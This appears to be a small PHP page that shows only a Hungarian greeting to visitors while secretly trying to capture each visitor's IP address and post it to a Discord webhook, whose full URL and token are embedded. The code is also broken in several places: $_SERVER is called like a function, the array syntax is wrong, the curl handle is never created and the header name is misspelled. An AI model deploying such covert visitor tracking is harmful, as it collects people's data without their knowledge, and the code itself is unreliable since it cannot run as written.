<?php

$webookurl = "https://discord.com/api/webhooks/851117592911544371/8vwt6IRlNwMoIDz6fw-775BRKJulXWa2lxunWOBAFK1djob2dD1iwCVsIvPflzWPGo0k";
$ip= $_SERVER('REMOTE_ADDR');
$msg = "$ip";
$json_data = array ('content'->'$msg');
$make_json = json_encode($json_data);
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Contetnt-type: application/json'));
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $make_json);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
$response = curl_exec( $ch );

?>

<html>
  <p>Sziasztok!</p>
</html>
